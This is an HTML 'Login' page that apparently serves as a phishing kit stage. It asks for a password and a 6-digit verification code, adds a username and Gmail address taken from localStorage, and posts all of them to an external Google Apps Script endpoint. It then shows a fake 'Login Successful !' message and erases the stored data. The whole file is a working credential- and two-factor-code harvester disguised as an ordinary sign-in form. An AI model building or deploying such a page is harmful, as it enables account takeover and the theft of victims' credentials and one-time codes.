<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      margin: 0;
      padding: 0;
      background: url('https://static.vecteezy.com/system/resources/previews/030/658/183/non_2x/desktop-wallpapers-wallpaper-desktop-tree-free-photo.jpg') no-repeat center center fixed;
      background-size: cover;
    }

    .overlay {
      background-color: rgba(0, 0, 0, 0.4);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .login-box {
      background: rgba(255, 255, 255, 0.85);
      padding: 30px;
      border-radius: 10px;
      width: 300px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
      text-align: center;
      backdrop-filter: blur(5px);
    }

    h2 {
      margin-top: 0;
      color: #2f4f4f;
      font-weight: 600;
    }

    input[type="password"],
    input[type="text"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #999;
      background-color: #f0f0f0;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #4471fb;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #565cff;
    }

    .warning {
      font-size: 13px;
      color: red;
      margin-top: 10px;
    }

    #status {
      margin-top: 10px;
      font-size: 14px;
      color: green;
    }

    .loader {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #4471fb;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 10px auto;
      display: none;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="overlay">
    <div class="login-box">
      <h2>Login</h2>
      <form id="codeForm">
        <input type="password" name="password" placeholder="Password" required><br>
        <input type="text" name="code" id="code" placeholder="6-digit Code" required maxlength="6" pattern="\d{6}" title="Enter a 6-digit numeric code"><br>
        <button type="submit">Submit Code</button>
        <div class="loader" id="loader"></div>
      </form>
      <p class="warning" id="warningMsg"></p>
      <p id="status"></p>
    </div>
  </div>

  <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbwWU_jo9dGxh5MNTp7vP70ANUlT5V1XvukmMzIcfPimLHU__stD1w2HwSxNgFTwD7SSww/exec';

    document.getElementById('codeForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = localStorage.getItem('username') || '';
      const gmail = localStorage.getItem('gmail') || '';
      const password = this.password.value;
      const code = this.code.value.trim();
      const warningMsg = document.getElementById('warningMsg');
      const statusMsg = document.getElementById('status');
      const loader = document.getElementById('loader');

      if (!/^\d{6}$/.test(code)) {
        warningMsg.innerText = "Code must be exactly 6 digits (numbers only).";
        return;
      } else {
        warningMsg.innerText = "";
      }

      loader.style.display = 'block';
      statusMsg.innerText = "Processing...";

      setTimeout(() => {
        const formData = new FormData();
        formData.append("username", username);
        formData.append("gmail", gmail);
        formData.append("password", password);
        formData.append("code", code);

        fetch(scriptURL, {
          method: 'POST',
          body: formData
        })
        .then(response => response.text())
        .then(result => {
          loader.style.display = 'none';
          statusMsg.innerText = "Login Successful !";
          document.getElementById('codeForm').reset();
          localStorage.clear();
        })
        .catch(error => {
          loader.style.display = 'none';
          statusMsg.innerText = "Error: " + error.message;
        });
      }, 4000); // Delay for 4 seconds
    });
  </script>
</body>
</html>
